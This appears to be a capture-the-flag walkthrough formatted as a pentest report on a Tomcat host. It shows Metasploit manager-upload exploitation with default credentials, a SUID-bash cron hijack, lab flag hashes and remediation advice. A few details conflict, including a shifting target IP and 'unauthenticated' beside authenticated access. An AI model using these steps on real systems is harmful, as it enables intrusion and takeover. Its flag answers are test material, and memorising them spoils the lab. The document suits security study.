# Penetration Testing Assessment Report

## 1. Executive Summary

During a security assessment targeting the internal host `10.48.164.252` (identified as the "Thompson" machine), a critical attack chain was successfully executed. The target was running an outdated version of Apache Tomcat featuring default credentials on its administrative interface.

By leveraging the application manager, authenticated remote code execution (RCE) was achieved. Local enumeration subsequently revealed a wild writable script executed periodically by a high-privilege Cron job, allowing for trivial privilege escalation to absolute administrative (`root`) control.

## 2. Assessment Scope & Target Information

- **Target IP Address:** `10.48.164.252` (Exploitation target shifted to `10.48.174.115` post-routing alignment)
    
- **Operating System:** Ubuntu Linux (Kernel 4.4.0)
    
- **Software Component:** Apache Tomcat 8.5.5
    
- **Objective:** Identify network entry points, execute initial access vectors, and audit local configuration flaws for privilege escalation paths.
    

## 3. Technical Findings & Exploitation Walkthrough

### Phase 1: Network Reconnaissance & Port Scanning

An initial port discovery scan was conducted via `nmap` targeting the system to map available attack surfaces.

Bash

```
sudo nmap -Pn -sV -sC -T4 10.48.164.252 -oN nmap/1.txt
```

#### Scan Results

|**Port**|**State**|**Service**|**Version / Details**|
|---|---|---|---|
|**22/tcp**|Open|SSH|OpenSSH 7.2p2 Ubuntu 4ubuntu2.8|
|**8009/tcp**|Open|AJP13|Apache Jserv Protocol v1.3|
|**8080/tcp**|Open|HTTP|Apache Tomcat 8.5.5|

### Phase 2: Web Application Directory & Service Enumeration

Initial attempts to interact with the web root on port 80 timed out. Focus was immediately pivoted to the Apache Tomcat instances running on port `8080`. A directory discovery scan via `dirsearch` was performed on the targeted web interface.

Bash

```
dirsearch -u http://10.48.164.252:8080
```

#### Discovered Active Administrative Paths

The brute-force enumeration identified critical exposed infrastructure portals:

- **`/manager/html`** (HTTP 401 Unauthorized) — The Tomcat Web Application Manager portal.
    
- **`/host-manager/html`** (HTTP 401 Unauthorized) — The Tomcat Virtual Host Manager.
    
- **`/examples/`** (HTTP 200) — Default servlet and JSP documentation examples.
    

### Phase 3: Initial Access via Tomcat Application Manager (RCE)

The explicit existence of the `/manager/html` interface combined with the severely outdated software version (`8.5.5`) prompted a credential verification attack. The Metasploit framework module `exploit/multi/http/tomcat_mgr_upload` was selected to automate the authentication and deployment phases.

Plaintext

```
msf > use exploit/multi/http/tomcat_mgr_upload
msf exploit(...) > set rhosts 10.48.174.115
msf exploit(...) > set rport 8080
msf exploit(...) > set HttpUsername tomcat
msf exploit(...) > set HttpPassword s3cret
msf exploit(...) > exploit
```

#### Exploitation Flow

1. **Authentication:** The instance fell victim to default/weak application credentials (`tomcat:s3cret`), granting administrative portal access.
    
2. **Payload Delivery:** A malicious Java Web Archive (`.war`) stager containing a Meterpreter listener payload was successfully compiled, uploaded, and deployed to the server container.
    
3. **Execution:** The application triggered the payload automatically, successfully establishing an active inbound Meterpreter session under the limited context of the application owner: `uid=1001(tomcat) gid=1001(tomcat)`.
    

- **`user.txt` Location:** `/home/jack/user.txt`
    
- **`user.txt` Hash:** `39400c90bc683a41a8935e4719f181bf`
    

### Phase 4: Local Enumeration & Cron Job Hijacking

Upon executing internal post-exploitation checks within the `/home/jack` directory, an operational anomaly was noticed.

A shell script named `id.sh` and its corresponding runtime output artifact `test.txt` were discovered. Inspecting the permissions and content revealed a critical logic flaw:

Plaintext

```
meterpreter > cat id.sh
#!/bin/bash
id > test.txt
```

Plaintext

```
meterpreter > cat test.txt
uid=0(root) gid=0(root) groups=0(root)
```

#### Vulnerability Analysis

- **The Vulnerability:** The file timestamp updates automatically every single minute, strongly indicating the existence of a high-privilege systemic `cron` job executing `/home/jack/id.sh` directly as the `root` user.
    
- **The Flaw:** The `id.sh` file permissions were globally loose and world-writable (`-rwxrwxrw-`), enabling the low-privilege `tomcat` user to inject arbitrary code into the execution path of the administrative task.
    

### Phase 5: Privilege Escalation

An interactive TTY terminal shell was established to manipulate the script payload safely.

Bash

```
/usr/bin/python3.5 -c 'import pty;pty.spawn("/bin/bash")'
```

Using the low-privilege access vector, a malicious command was appended to the script. The intent was to add the Setuid (`SUID`) sticky bit configuration directly onto the system native `/bin/bash` binary upon the next scheduled system execution loop.

Bash

```
tomcat@ubuntu:/home/jack$ echo "chmod u+s /bin/bash" >> /home/jack/id.sh
```

Within 60 seconds, the underlying automatic high-privilege background cron job parsed the newly appended string and executed the modification as `root`.

Executing the modified binary while preserving user privileges granted instant, unrestricted superuser execution:

Bash

```
tomcat@ubuntu:/home/jack$ /bin/bash -p
bash-4.3# id
uid=1001(tomcat) gid=1001(tomcat) euid=0(root) groups=1001(tomcat)
```

#### Results

- **Effective User:** `root` (`euid=0`)
    
- **`root.txt` Hash:** `d89d5391984c0450a95497153ae7ca3a`
    

## 4. Vulnerability Summary & Remediation

### 1. Exposure of Management Interface with Default Credentials

- **Risk:** Critical
    
- **Impact:** Immediate unauthenticated remote code execution and initial system breach.
    
- **Remediation:** Remove or restrict network access to the `/manager` and `/host-manager` administrative consoles. If business needs require them, enforce a strict password policy using complex, non-default strings and configure IP-based access control lists (ACLs) to block public exposure.
    

### 2. Loose Permissions on Scheduled Scripts (Cron Job Hijacking)

- **Risk:** High / Critical
    
- **Impact:** Trivial local privilege escalation leading to complete system takeover.
    
- **Remediation:** Ensure that any scripts executed by system-wide automation handlers (`cron`, `systemd`) are owned strictly by `root` and are under no circumstances write-accessible by standard or low-privileged service accounts.
    

Bash

```
# Apply proper ownership and secure permissions
sudo chown root:root /home/jack/id.sh
sudo chmod 755 /home/jack/id.sh
```